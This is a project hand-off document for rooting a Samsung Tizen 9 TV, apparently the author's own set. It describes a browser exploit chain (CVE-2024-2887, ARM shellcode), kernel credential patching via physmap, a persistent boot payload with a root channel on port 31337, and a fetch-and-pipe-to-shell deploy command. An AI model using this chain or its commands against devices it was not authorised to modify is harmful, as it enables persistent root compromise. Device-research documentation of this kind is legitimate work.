# AGENTS.md — hand-off for the next agent or human

You are continuing a **Samsung Tizen 9 TV root** project. Read this file first,
then `docs/EXPLOIT.md` (how it works), `docs/USAGE.md` (running it),
`docs/LOGGUIDE.md` (every beacon and tool error decoded, with next steps),
`docs/ROOT-METHODS.md` (what was found), `docs/FAILED.md` (do not repeat these)
and `docs/SERVER-HOSTING.md` (the PC-side server). History lives in `CHANGELOG.md`,
and the current work list — triaged from an independent code review — is
`docs/OPEN-ISSUES.md`: read it before changing anything, it says what is known
broken, in what order to fix it, and how to prove each fix.

## 0. Maintaining this repo — read before editing

**Any change you make must be recorded in [`CHANGELOG.md`](CHANGELOG.md).** Add an
entry under `Unreleased` (or a dated batch if you are landing several related
changes together), listing what changed and **why**. If you change a script's
behaviour, a payload offset, a documented procedure or a trap, the changelog entry
is part of the change — not an optional extra.

Division of labour:

| File | What it holds |
|---|---|
| `CHANGELOG.md` | dated history: what changed and why |
| `docs/` | the *how*: exploit chain, usage, root methods, dead ends, portability |
| this file | the *state now*: current status, procedures, verification, traps |

Do not put dated narrative here; put it in the changelog and link to it.

## 1. Current state

**Rooted and persistent.** The TV roots itself during boot through the replaced IL of
the stock on-boot app `com.samsung.tv.MultiControl-Service`, then serves a command
channel on TCP 31337 (line protocol, replies end with `__END__`).

| | |
|---|---|
| Payload | repo **v41** (`1ab4343e…`, 33,792 B), deployed 2026-10-27; every beacon carries `tok=<rootchan.token>` (live `c1eadc03`; forged/absent tokens refused). **TV is on v41**; `payload_backup.dll` keeps the previous build and stock IL `mcs_orig.dll` is intact. A v41 cold boot and the uninstall cycle are still owed. |
| Boot-to-root | **Attempt 2 is the floor; v37 cold boot 37 s; v39.2 cold boot 39 s; v41 restart ~1 s.** v41 (2026-10-27) restart-rooted in ~1 s (`self-patch`, `tok=c1eadc03`); a v41 **cold boot** is still owed. v39.2: deploy reload-rooted in 6 s, cold boot at t=39. Earlier v37: cold boot t=37; v35: 37 s; v34: 34/68 s; v33: 38-39 s; v32: 59 s; v31: 132 s. Marker: `share/root_boot.txt` |
| Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
| Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
| Device | physmap nodes `/dev/video40` (jpeg), `/dev/video30` (hen, the browser stub) and `/dev/video60` (dvde). Exclusivity is **per instance**, but the payload may only **retry video40** on `EBUSY`: video30 hangs at phys `0x46000000` and the payload's scans reach `0x60000000`, so switching nodes on a busy video40 would break the boot (review 2026-10-26). video30/video60 are tried only when a node reports `ENOENT`/`ENODEV`. The app runs as uid 5001, gid 44 |

**Serve port 80 with `pysrv.exe`, never `python.exe` on this PC.** The Windows
firewall has inbound *Block* rules for `python.exe` and *Allow* rules for
`pysrv.exe`, so a `python server.py` server is invisible to the TV (no page, no
beacons) while it answers perfectly from the PC's own loopback. `root.ps1`'s
`Find-Python` already prefers `pysrv.exe`; starting `server.py` by hand does not.

A root channel that refuses connections cannot tell "app never started" from
"app started and failed" — `logs/beacons.log` can, and it works before rooting.
No beacon at all means AUL is not launching the app (boot row gone / DLL broken);
beacons without 31337 means the payload is failing later and the chain names the
step. The remote's power button is standby, not a boot: only a real cold boot
runs the hook. To force one, ask for a mains unplug (trap 12: `systemctl --force
reboot` from the payload once left the set in a standby the remote could not
wake).

The boot sequence is deliberate: the first launch after a cold boot usually cannot read
task memory coherently. v29 kept the exit-on-purpose design but gave attempt 1 four
rounds; the rounds are `{0,0,5000,5000}` (the v31 10 s last wait was reverted).
**Attempt 1 is a lottery for lowmem placement.** A high value (>= `0xE0000000`) is
a garbage read under VMSPLIT_3G, not a readable high allocation, so no amount of
in-process waiting helps; v33's `high-alloc` gate fast-exits as soon as that is seen, and AUL
relaunches, because only a fresh process re-rolls the allocation. Four fast attempts
are allowed (counter in `/tmp/.dsh_try`, which resets at boot), then a long
in-process fallback takes over. The gate is fast-mode only, so long mode cannot
loop early exits.

### Physmap window (v24–v27) — the read-staleness fix

The first process after a boot (and the first processes after a `kill -9` restart)
read stale bytes through the physmap while `getuid()` saw the live values: the
kernel's dirty cache lines for pages it keeps touching (a running task's struct, the
app's own cred) never write back, and a physmap mapping whose VA does not share the
kernel's VIPT cache set (L1 way size — the alias period measured here is **32 KiB**)
fetches stale RAM. `MapPage` now maps every page at **VA ≡ PA (mod 32 KiB)** out of a
reserved `PROT_NONE` window (`ReserveWindow`/`MapPage`/`ReleasePage` in
`payload/Program.cs`), so our cache line *is* the kernel's line and both directions
are coherent. The alignment was stepped 8 KiB (v24) → 16 KiB (v25) → 32 KiB (v27):
each step removed the next PA bit from per-slot parity — v25's 16 KiB slots left
bit 14 to slot allocation order, which was the v25 attempt-4 "inti" stale-cred
anomaly (see CHANGELOG). Slots are re-protected `PROT_NONE` instead of munmapped — a
hole in the window could be grabbed by another `mmap` and later clobbered by a
`MAP_FIXED`. If the window **reservation** fails, `MapPage` falls back to the plain
mmap and beacons `physmap window unavailable`. A failed *fixed* mapping is different:
Linux 5.4 has already unmapped that slot, so it is a hole. v30 restores it with
`MAP_FIXED_NOREPLACE` (never clobbers a thief), beacons once
(`physmap fixed map failed at … (hole restored), plain fallback`), and if the hole
cannot be restored it switches the window off (`physmap window off: …`). `ReleasePage`
does the same when a slot re-protect fails. One-time beacon per process:
`physmap window at <va> slots=2048x8000`.

**Second limit, found on the v31 cold boot - and now measured.**
The kernel is **not LPAE**: `CONFIG_ARM_LPAE` is unset, `CONFIG_VMSPLIT_3G=y`,
`CONFIG_PAGE_OFFSET=0xC0000000`, `CONFIG_HIGHMEM=y` (reference tree,
`firmware/gpl/kernel_src/linux-5.4/.config`). The linear map covers **lowmem
only**; with `PHYS_OFFSET 0x20000000`, `VA = PA + 0xA0000000`. `/proc/zoneinfo`
is the ground truth (2026-10-27): Normal `start_pfn 0x20000`, HighMem
`start_pfn 0x50400`, so `max_low_pfn = 0x50400` and `high_memory` is
**VA `0xF0400000`** (`p2v(0x50400000)`). `meminfo` is vendor-adjusted here
(HighTotal 303,104 pages > HighMem present 198,656), so the earlier
meminfo-derived `0xE4E42000` estimate was wrong. The `0xE0000000` read failures
are therefore **inside** the linear map: the video40 DMA window (~512 MiB,
matching "reads past 0x46000000 hang") is the prime suspect, not the CPU map.
A high task/cred value is still treated as a garbage read (v31: 0/21 high creds,
0/81 high task pointers), and the v38 `high-scan` verdicts must be re-read
against `0xF0400000`. Attempt 2 remains the floor; do not add rounds/waits.

Diagnostic beacons (fifth pass, `docs/OPEN-ISSUES.md`): the `child=` line now carries
`pu=` (the latched child's parent-cred uid), and while the direct-parent patch gate
stays closed the payload beacons `direct-probe …` lines carrying the raw parent/cred
pointers, the uid read, the same uid through a plain mmap (`plain=`) and the first 18
bytes at the cred (`head=`) — that splits a stale cred *pointer* from stale cred
*content*. Silent on success. Python twin: `direct_parent_patch` in `tools/sim_rpc.py`.

Verified independently: two cold boots after a power-cycle (43 s and 47 s from
power-on, no PC involvement) and one full run from a stock TV through the one-click
flow. The sequence of changes that got here is in `CHANGELOG.md`.

**Fallback if the payload is ever missing:** `python tools/tv_rootwatch.py` with the TV
browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
`server/recover.sh` from that shell to reinstall the payload.

Payload lineage (v5 → v23, and what each version fixed) is in `CHANGELOG.md`; the label
regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.

### Channel hardening (v14, extended in v15/v16)

The app must still be able to prove root "with no PC", so nothing on the boot path
may block on the network. v18 also prefixes every beacon with kernel uptime
(`DSHROOT t=<n>s …`) so a slow boot is timed without the PC clock:

- **31337 binds one address (v16).** The listener binds the TV's OWN address,
  derived at runtime from the route to the recorded PC (a UDP `connect` that sends
  nothing) — never a hardcoded IP, so another person's laptop needs no change.
  That keeps it off Wi-Fi Direct/tethering, which a wildcard listener was reachable
  from. It is re-derived every 30 s and the listener rebound if the address moves
  (`Pending()` polling makes that possible); with no route yet (TV offline) it
  falls back to `Any` and beacons `chan bind … failed`, because a working channel
  beats a closed port. `PeerAllowed` still filters the peer.
- **Cred writes are ours-only (v15).** `PatchCred` refuses any cred whose uid is
  not 5001, so a bogus `real_parent`/`parent` that happens to point at init's
  cred (uid 0) is never written; a uid-0 cred counts as "already done". This is
  the full M4 close — `SaneCred` remains the pointer-shape check. The Python
  lane mirrors it in `kernel_root.patch_ours()` (used by `root_via_fork` and the
  legacy `root()`); `tv_rootwatch.root_by_tail` was already gated.

- **Beacons have a 500 ms connect timeout.** A stale `rootchan.host` (PC off, or
  the address moved to another subnet) used to cost TCP SYN retries inside the
  ~40 s budget. The local `share/root_boot.txt` marker is the durable record.
- **The physmap node is closed in every fork child** before it sleeps, and closed
  before the fast-exit `Environment.Exit`. Without that, each landmark child kept
  the inherited opener for 120 s and the next AUL launch sat in the `open()`
  retry — a slow-boot cause that looked like a failed round.
- **31337 bounds every client.** 30 s read/write timeout, 4 KB per command line,
  8 KB pending without a newline, then the client is dropped. One silent
  connection used to own the single-threaded accept loop until the app restarted.
- **The allowlist fails closed.** `share/rootchan.allow` must exist and list the
  peer; `deploy.sh` writes it *before* the DLL. A hand-copied payload therefore
  needs that file too — create it with the PC's address or the channel stays shut.
### Auto-update is pinned off

The TV would happily replace the app the payload lives in. The payload therefore
re-asserts the menu setting at every boot (v13, unchanged through v23) and logs the readback
(`DSHROOT autoupdate … = Int32: 0`):

```sh
buxton2ctl set-int32 system db/menu/support/softwareupdate/autoupdate 0
buxton2ctl set-int32 user   db/menu/support/softwareupdate/autoupdate 0
buxton2ctl get      system db/menu/support/softwareupdate/autoupdate
```

The key was found in `SWUAutoUpgrade`'s string table; `0` is off. The units behind
it are `swu-auto-upgrade.path` (fires on
`/run/user/5001/.swu-auto-upgrade-launch`) and
`org.tizen.tv.swu.otascheduler`. For a network-level backstop, block the OTA hosts
at the router — `otn2.samsungcloudcdn.com`,
`otnprd8..11.samsungcloudsolution.net`, `samsungotn.net`.

### The command channel survives a runaway command

`Run()` redirects a command's output to a temp file rather than a pipe, and on the
120 s timeout kills the whole process tree. A pipe was closed only when every
descendant closed it, so one long-lived grandchild (a `grep -r /opt`) used to wedge
the channel until the TV was power-cycled. A timed-out command now returns
`[timeout: killed after 120s]` and the channel keeps serving.  The reply goes to
a **unique** temp file per call (`/tmp/.dsh_cmd.<pid>.<n>.out`), and the command
is passed to the shell as an **argument** (`sh -c 'exec > "$1" 2>&1; exec /bin/sh -c "$2"'`),
so `}`, `;` or quotes in a command cannot break the wrapper, and a background
thread (auto-update off) can run commands concurrently with the channel.

## 2. Target facts

| Item | Value |
|---|---|
| Model / platform | QNX1D series, 2024 Neo QLED (QTV T09 platform) |
| OS | Tizen 9 |
| Kernel | Linux 5.4.249, ARM32 (VMSPLIT_3G + HIGHMEM; `CONFIG_ARM_LPAE` is **not** set), `PAGE_OFFSET 0xC0000000`, `PHYS_OFFSET 0x20000000` |
| Browser | Chromium 120.0.6099.5 (WasmGC available) |
| Kernel Image | phys `0x20008000`, signature `ee4400eb00900fe1` |
| `init_task` | `0xC0957180` (phys `0x20957180`) |
| Task list offset | `0x23C` (`prev` links; `next` unusable) |
| cred / real_cred / comm | task+`0x3F8` / `0x3F4` / `0x400` |
| Full caps | `0x0000003fffffffff` |
| Root channel | TCP `31337` |

These constants are specific to this firmware build. Before using the toolkit on
another model or firmware, re-measure the Image base, `init_task`, the task-list
offset and the cred offsets, and verify the physmap still works (see
[`docs/PORTABILITY.md`](docs/PORTABILITY.md) and `README.md` → Porting to another
Tizen 9 TV).

## 3. Architecture

```
TV browser (uid 5001, gid 44 video)
  └─ index.html ──CVE-2024-2887──▶ renderer R/W + ARM shellcode
        └─ physmap stub: opens /dev/video30, serves RPC over TCP/80
              ▲
PC            │ server/server.py (port 80: page + RPC gateway on 127.0.0.1:9998)
              │ tools/auto_root.py / kernel_root.py / physmap.py / root_shell.py
              ▼
TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
  └─ MultiControlService.dll (payload) ─▶ physmap ─▶ cred patch ─▶ TCP 31337
```

## 4. Required tools

- **PC on the same LAN.** The TV must reach the PC's TCP/80; the PC must reach
  the TV's TCP/31337.
- **Python 3** for the server and clients.
  - On Windows the base `python.exe` path was blocked by a firewall rule; the
    server was run under a renamed copy (`pysrv.exe`). Any interpreter the
    firewall permits works; `root.ps1` auto-detects one.
- **.NET SDK 6+** only to rebuild the boot payload.
- **keystone + capstone** (Python) only to rebuild `tools/physrpc.S` into
  shellcode.
- No sdb, no Tizen Studio, no firmware images, no flashing.

## 5. Files

`root.ps1` is the one-command entry point; it expects this layout:

| File | Purpose |
|---|---|
| `server/server.py` | port-80 HTTP server + RPC gateway + shell bridge |
| `server/index.html` | page that loads the browser chain |
| `server/payloads/browser_payload.js` | browser V8 payload (hdbreaker chain + physrpc) |
| `server/lib/wasm_builder.js` | WasmGC helper used by the payload |
| `server/deploy.sh` | deploy TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`, `@BEACON_TOKEN@`), rendered per request by `server.py`; transactional with rollback |
| `server/uninstall.sh` | restores the stock app (run via the channel); relabels before `mv`, removes the allowlist last |
| `server/payload.dll` | the root-on-boot payload served to the TV |
| `tools/physmap.py` | RPC client (hello, read/write, ops) |
| `tools/kernel_root.py` | finds the kernel/`init_task`/task and patches the cred |
| `tools/auto_root.py` | waits for a stub, roots it, runs the deploy script |
| `tools/root_shell.py` | root-channel client (TCP 31337); connect failures self-diagnose |
| `tools/run_root.py` | run a shell command as root via op 7 (manual) |
| `tools/write_root.py` | write a file as root via op 8 (manual) |
| `tools/beacons.py` | beacon-log analyzer: per-boot verdicts + hints (`--json`); dictionary in `docs/LOGGUIDE.md` |
| `tools/physrpc.S` | ARM32 RPC stub source (clamps every client length) |
| `tools/build_physrpc.py` | assembles the stub (keystone/capstone); `--check-embedded` diffs it against the page |
| `tools/physrpc_shellcode.bin` | the assembled stub (committed; `embed_physrpc.py` needs it) |
| `tools/embed_physrpc.py` | writes the blob into `browser_payload.js`'s `SHELLCODE` (`--check`) |
| `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`; not a validated pair) |
| `tools/sim_rpc.py` | in-memory physmap RPC (no TV); `python tools/sim_rpc.py` self-test |
| `tools/test_gateway.py` | gateway integration test (no TV): RSET, token pairing, forwarding, BUSY, /save cap |
| `tools/sanitize_for_public.py` | public-release redaction: copy mode + `--check` gate (exits 1 on any private token) |
| `tools/test_sanitize.py` | offline selftest for the sanitizer |
| `tools/dwarf_offsets.py` | kernel struct offsets from a DWARF vmlinux; `--check` gates sim-vs-TV fingerprint (porting) |
| `tools/listwalk.py` | layout-shift-proof task-list locator: validates list_heads by back-links, walks without knowing 0x23c (porting; self-test offline) |
| `tools/test_listwalk.py` | offline gate for listwalk + the dwarf fingerprint |
| `tools/test_shell.py` | deploy/uninstall dry tests under `sh` (no TV): backups, label, boot row |
| `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
| `tools/test_logs.py` | offline: beacon-analyzer fixtures (log **and** the on-TV marker), tool error paths, ps1 parse guard |
| `tools/test_constants.py` | cross-checks the same offsets/limits/node names across `Program.cs`, `sim_rpc.py`, `kernel_root.py`, `physmap.py`, `physrpc.S`, the page and `deploy.sh` |
| `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
| `payload/Program.cs` | boot payload source (v41; TV runs v41 since 2026-10-27) |
| `payload/global.json` | pins SDK 10.0.301 (rollForward latestPatch): a different SDK can change the artifact md5 |
| `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
| `root.ps1` | one-command runner (server + root + deploy + verify) |
| `uninstall.ps1` | one-command uninstall (restore stock + verify) |
| `server/logs/` | **all runtime output** (created on demand, git-ignored) |

### Logs

Everything the toolkit writes at runtime goes under `server/logs/`, so the
toolkit directory itself stays clean:

| Path | What |
|---|---|
| `logs/server.out`, `logs/server.err` | stdout/stderr of the server, redirected there by `root.ps1` / `uninstall.ps1` |
| `logs/shell.log`, `logs/shell.log.1` | rolling capture of the TV shell/console (8 MB rotation) |
| `logs/beacons.log` | one timestamped line per `DSHROOT …` beacon from the payload — **the fastest way to see whether the app started at all** |
| `logs/tv/tv_output_*.txt` | dumps the exploit page POSTs to `/save` (kept to the newest 100; override with `TV_OUTPUT_KEEP`) |

`/logs/**` is refused by the HTTP server (404), so the directory is never served
to the LAN even though it sits inside the docroot. If you run `server.py`
yourself, it creates `logs/` next to itself; only the two redirect files are the
launcher's responsibility.

Line-by-line beacon decoding (every message, field, verdict and next step):
`docs/LOGGUIDE.md`. `python tools/beacons.py` turns `beacons.log` into per-boot
verdicts with the same hints; `--json` for machines.

### Root without the app payload (host watchdog)

If the payload is not installed (or the TV was just uninstalled), root is
available through the browser lane plus a watchdog:

```
# after each boot, with the TV browser on http://<pc>/index.html
python tools/tv_rootwatch.py          # root the stub, then op5 -> shell on :9999
```

`tools/tv_rootwatch.py` starts `server/server.py` with `pysrv.exe` if port 80 is
down, attaches to the RPC gateway, and roots the stub - tail walk for the
`PHYSRPC1` comm first, otherwise a content scan for owner creds
(`ids = 5001,100 x4` at `cred+4`, bounded to phys `0x20000000-0x40000000` because
reads past `0x46000000` hang the stub). With the shell step it then sends op 5, so
**`127.0.0.1:9999` becomes an interactive root shell** (`id -u` -> `0`); it dies
when the page reloads, so re-run the watchdog after a reload.

Note: once the browser process's cred has been patched in a boot, new renderers
inherit it, so later stubs come up already root and the watchdog reports
`root: already`. A reboot clears that - the watchdog then does the real work.

The only manual step is the page load. Set the TV browser's start page to the
URL once and re-running the watchdog is all that is needed after a boot.

### Wedged stubs: `RSET` instead of a server restart

A stub can stop answering without the TCP socket closing - typically after an
`op 5` (EXEC) or `op 7` (RUN) consumed it, or after a TV power cycle that left a
half-open socket. The gateway used to keep such a socket as its current pairing
forever, so every later client got a cached hello and nothing else, and the only
cure was restarting the server.

Now the gateway accepts a 4-byte **`RSET`** sentinel instead of a tunnel client:
it closes the paired TV socket and replies `OK` (or `IDLE` if nothing was
paired). Use it from Python:

```python
import physmap; print(physmap.reset_stub())   # "OK" / "IDLE" / "no-gateway(...)"
```

The next page load then pairs cleanly. The tools call it automatically
automatically when no live stub answers. Treat a stub as single-use for `op 7`
and never send FILE (op 8) bytes to a stub that has already been turned into a
shell - that corrupts the stream and wastes the page load.

### Repository hygiene (`.gitignore`, `.gitattributes`)

`.gitignore` is the source of truth for what is tracked versus ignored; do not
duplicate an inventory here.

`server/payload.dll` is the artifact the TV fetches during deploy and is
byte-identical to `payload/out/MultiControlService.dll` (md5 `1ab4343e…`, v41;
reproducible — see §9), so a clone runs without a .NET SDK. Rebuild with
`dotnet build payload/BootPayload.csproj -c Release -o out`, then copy it over
`server/payload.dll`; there is **no `WANT=` constant to update** any more — the
server renders the hash/size into `deploy.sh` per request from the file it serves.
`server/deploy.sh` is a TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`, `@BEACON_TOKEN@`);
serving it from a plain static server is refused (`NEED_RENDER`), so the stale
generated-copy class (v37/v38 `deploy_local.sh`) cannot recur.

`.gitattributes` pins `*.sh`/`*.py` to **LF**: the TV's busybox `sh` treats a CR
as part of the token (`#!/bin/sh^M: not found`), so a Windows checkout must not
rewrite them. `*.ps1` is CRLF; DLLs and other binaries are marked `binary`.

Not needed at runtime: `payload/` source, docs, `.NET SDK`.

## 6. Reproduce the root from scratch

**Fast path:** `pwsh -File root.ps1 -TvIp <tv-ip>` does steps 0–4 and 6 below
(use `-DryRun` first). It needs `tools/` + `server/` beside it, or
`-ToolkitDir`; it reuses a server already serving `index.html`, and
`-RestartServer` replaces a different server on port 80. The manual steps that
remain are on the TV remote: load the page, then reboot.

Placeholders: `<HOST_IP>` = PC, `<TV_IP>` = TV.

```sh
# 0. on the PC
cd server
python server.py                        # or: pysrv.exe server.py

# 1. on the TV browser open
#    http://<HOST_IP>/index.html
#    wait for HARNESS_UP / WASM_LOADED / PAYLOAD_LOADED / RUNNING
#    do not open another tab; do not reload after RUNNING

# 2. root the renderer (fresh stub!)
cd ../tools
python kernel_root.py --fork
#    accept ONLY: ids = (5001, 100, 5001, 100, ...) then
#                 uid=0 cap_permitted=0x3fffffffff
#    if ids = (0,0,...) -> the cred was already patched (root) or bogus;
#    if it says "skip ... (not a cred)" -> reload the page and retry

# 3. verify
python run_root.py "id" 6               # uid=0(root)

# 4. deploy the boot payload.  deploy.sh is a TEMPLATE: server.py renders H=
#    from the address the TV used and WANT=/SIZE_WANT= from the payload.dll it
#    serves, so there is no generated copy to go stale (the old deploy_local.sh).
python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
#    expect: UID=0, SIZE=33792, MD5=1ab4343e..., COPY=ok, HOST_FILE=..., DEPLOY_DONE

# 5. reboot the TV (exit the browser first so it does not restore the page)

# 6. permanent root
python root_shell.py "id" <TV_IP>        # uid=0(root)
python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'" <TV_IP>
```

`tools/auto_root.py` automates steps 2 and 4: start it, then load the page once.

## 7. Verification checklist

Run `python tools/test_all.py` first — it covers the offline layers (cred layout,
gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:

- [x] `root_shell.py "id" <TV_IP>` returns `uid=0(root)` - **verified 2026-10-26**.
- [x] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff` - **verified 2026-10-26**.
- [x] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `1ab4343e…` (verified 2026-10-27; `payload_backup.dll` is v39.2 `010946ff…`)
- [x] Cold boot with the browser closed → attempt 1 high exits in ~2 s (v39.2, 2026-10-26: **39 s**, attempt 1 `fast-exit` t=29, attempt 2 `self-patch` t=39, `ROOTCHAN` t=40) (`high-alloc … fast-exit`), attempt 2 roots; v37 cold boot observed **37 s** (attempt 2; attempt 1 `seen=0`); v35: 37 s; v34: 34 s and 68 s. Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor, but a slow hunt can push to attempt 3.
- [ ] `kill -9 <app pid>` → channel back in ~5–45 s (v33's high-alloc gate skips a high attempt quickly; otherwise attempt 2 roots), still uid 0.
- [x] `python tools/test_all.py --tv` against a fresh page load (stub protocol
      + clamps) - **10/10 layers passed 2026-10-27** on the v40 token path (hello, kernel read, oversize READ/WRITE refused, stub alive). Details per layer: `docs/TESTING.md`.

## 8. Traps (each cost hours — read `docs/FAILED.md`)

1. **Stub lifetime is minutes.** The renderer is killed by the browser
   watchdog while blocked in the shellcode. Deploy in one batch.
2. **Reloading the page kills the stub.** Each load = a new stub; root it and
   deploy without reloading.
3. **The physmap node is exclusive per INSTANCE, and the payload must stay on
   video40.** Two different nodes can be open at once, but only video40 serves
   the reads the payload performs (video30 hangs at phys `0x46000000` while the
   payload scans to `0x60000000`). So the payload retries video40 on `EBUSY`
   for the whole budget and moves to video30/video60 **only on
   `ENOENT`/`ENODEV`**. Do not "cycle on busy": that turns a browser stub
   holding video40 into a boot that cannot finish its scan (review 2026-10-26).
   `O_RDONLY` skips the busy check (diagnostics only: `PROT_WRITE` needs RDWR).
4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
   the child.
5. **Do not read a kernel pointer above the lowmem end (`0xF0400000`).** The kernel is VMSPLIT_3G
   with HIGHMEM (`CONFIG_ARM_LPAE` unset), so the linear map ends at
   `high_memory` — **measured `0xF0400000`** (zoneinfo `max_low_pfn 0x50400`; meminfo is vendor-adjusted) — and anything
   above it is vmalloc/module space where `va - 0xA0000000` is not a valid
   translation. A value above that boundary is a garbage read, not a high allocation
   (v31: 0/21 high creds, 0/81 high task pointers; `0xE0000000` is well *inside*
   the map - its read failures are the video40 DMA window, not a map end). Keep accepting
   the full kernel range for POINTER SHAPE, but do not expect to read there.
6. **Post-fork managed code.** Use a pre-pinned buffer + raw
   `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
7. **Short commands.** The stub's `cmdbuf` is 512 B and is NUL-terminated after
   the body (v39), so `run_root.py` / `auto_root.py` refuse commands over 508 B
   (`write_root.py`: 255 B path, 4 KB chunk); use `curl …/deploy.sh | sh`.
   Commands over ~100 chars were once observed killing a stub even under the
   limit, so prefer a fetched script for anything multi-step.
8. **Do not fork repeatedly on one stub**; zombies poison the task walk.
9. **Do not touch `/mnt/systemrw`** (OTA/update data) and do not poke
   `/dev/tztv_tcon` (TCON flash = brick risk). Concrete trigger found in the
   reference tree (`research/BOOT-HOOKS-2026-10-21.md`): a file in that area
   whose first line is `219971` calls `do_opt_reset`, which reformats `/opt`
   from `/common/data_backup.xz` at the next boot — i.e. your payload, backups
   and boot row are gone.
10. **Keep TV auto-update off.** An OTA replaces the app and the boot row.
11. **The browser payload rewrites its own callback from the URL.** The blob ships
    a TEST-NET placeholder (`192.0.2.1:80`); the page patches **both the IP and
    the port** from `location.hostname`/`location.port`, and **aborts** if it was
    served by hostname (a silent fallback used to send the TV to a foreign LAN).
    Open the page by IPv4. If you change `tools/physrpc.S`, rebuild + re-embed
    (`build_physrpc.py`, `embed_physrpc.py`) and keep both `--check` modes green.
12. **Do not reboot the TV with `systemctl --force reboot` from the payload.** It
    worked once and then left the set in a deep standby that the remote could not
    wake; only unplugging it from the wall brought it back. Ask for a power cycle
    (or press the TV's own button) instead.
13. **`root_via_fork` needs every tag, not the first one — and a uid-0 cred must
    not end the walk.** A freed `PHYSRPC1` task from an earlier page load can sit
    nearer the list tail than the live stub; its cred pointer fails the sane-cred
    check, and if it happens to point at a uid-0 cred, an "already rooted" early
    return hides the live stub. `_find_tags_near_tail()` returns all of them;
    `tv_rootwatch.root_by_tail` only writes uid-5001 creds and reports `already`
    only when none exist. `root_via_fork` **and** the legacy non-`--fork` `root()`
    return False (no EXEC) when the only creds they saw were uid 0. Keep all
    three properties. Also: if a fork returns a pid, that landmark exists — do
    not fork a second one because the walk missed it (trap 8).
14. **Physmap mappings alias kernel cache.** `MapPage` used to keep the VA, so
    `PatchCred` readback could see uid 0 while `getuid()` stayed 5001 (the ARM
    stub munmaps every op and never hits this). v18 `cacheflush`es every
    `Write32`/`ReadPhys` and `DropPages()` after a successful patch. Do not
    cache physmap pages across a `fork()` landmark. v25 extends this to the
    READ direction (kernel wrote, physmap read stale): map at VA ≡ PA
    (mod 32 KiB) — see "Physmap window" in §1.
15. **Do not drop a new `PHYRFORK` whose parent cred reads uid 0 (or anything
    else).** A stale word is usually physmap garbage, not init (v21 cold boot:
    `seen=1 skip-orphan=1`); v23 latches *every* new `PHYRFORK` not in `pre`
    and lets `PatchCred` refuse non-5001. Do not restore the v21 "skip a live
    foreign uid" rule — a stale read can look foreign, and that skip is what
    lost attempt 1. Kill leftover landmarks so a real init-reparented orphan is
    in `pre` and never looked at.
16. **A high-half read is a garbage read, not a slow allocation.** Every coherent
    task/cred read in the v30/v31 cold-boot logs was `< 0xE0000000`, but
    `high_memory` is **`0xF0400000`** (zoneinfo), so that line is inside the map;
    the failures are the video40 DMA window (~512 MiB), not a map end. Attempt 1's
    fresh process does not "re-roll
    into a readable high allocation" — it re-rolls into lowmem. Do **not** "fix"
    attempt 1 with more rounds/waits (v31's 10 s last wait booted in 132 s vs
    v30's 51 s); v33's `high-alloc` gate fast-exits in ~2 s and the fifth pass is
    closed with attempt 2 as the floor. v39.2 deploy/restart (2026-10-26): attempt 1 fast-exit, attempt 2 self-patch,
    root 6 s; cold boot rooted at t=39 the same evening (attempt 1 t=29, attempt 2
    t=38-39).
17. **Ping is not evidence on this PC — probe TCP instead.** Windows `ping`
    counts ICMP *error* replies as replies: with the PC off the TV's LAN
    (Wi-Fi instead of Ethernet, or the NordVPN tunnel up), the tunnel gateway
    (`198.51.100.1`) answers "Destination net unreachable" and `ping` still
    prints **0% loss and exits 0**; a proxy-ARP router can likewise answer for
    an offline set. This cost a wrong "TV looks half-alive" conclusion on
    2026-10-26. The toolkit's liveness checks are therefore TCP-only:
    `Test-TvPort` (both `.ps1`) is a raw `TcpClient` connect with a 1.5 s cap,
    `uninstall.ps1` decides "TV came back" via stock ports 8001/8002/7676/9197
    (`Test-StockTv`), and the other honest signal is a fresh `DSHROOT` line in
    `server/logs/beacons.log`. "PC off the TV's LAN" itself looks like this: no
    IPv4 on the Ethernet adapter, Wi-Fi/VPN adapters present, and no `arp -a`
    entry for the TV.

## 9. Rebuilding the payload

```sh
cd payload
dotnet build -c Release -o out
# new file: out/MultiControlService.dll
```

Then deploy it with the browser root channel (`write_root.py` or a `deploy.sh`
that downloads it) and reboot. Things to preserve when editing `Program.cs`:

- `Kptr(v) => v >= 0xC0000000` for pointer shape (accept the full kernel range,
  trap 5). Do **not** expect to read above the lowmem end (`0xF0400000`): v31
  cold-boot evidence is 0/21 high creds coherent, 0/81 high task pointers, and a
  value there is a garbage read, not a readable high allocation.
- Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
- **Close `_fd` in the child with `syscall(6, _fd, …)`** before it sleeps, and
  keep the child free of CLR allocations.
- `Thread.Sleep(700)` in the parent after `fork()`.
- Patch the **parent** task's cred (`real_parent`), not the child's.
- Validate the cred (`SaneCred`: usage, ids, physical range) **and only write it when its uid is 5001** (`PatchCred` enforces this in v15).
- Close `_fd` after rooting, before `RootChannel()`.
- Keep the channel line protocol and the `__END__` terminator.
- `cacheflush` after every physmap write (and before every read); `DropPages()`
  after `fork()`, each hunt pass, and a successful `PatchCred`.
- **The physmap window (v27, hardened in v30):** `MapPage` maps every page at
  VA ≡ PA (mod 32 KiB) out of the reserved `PROT_NONE` window, and `ReleasePage`
  re-protects slots instead of munmapping (a hole in the window could be grabbed
  by another mmap and later clobbered by a `MAP_FIXED`). A failed fixed map is
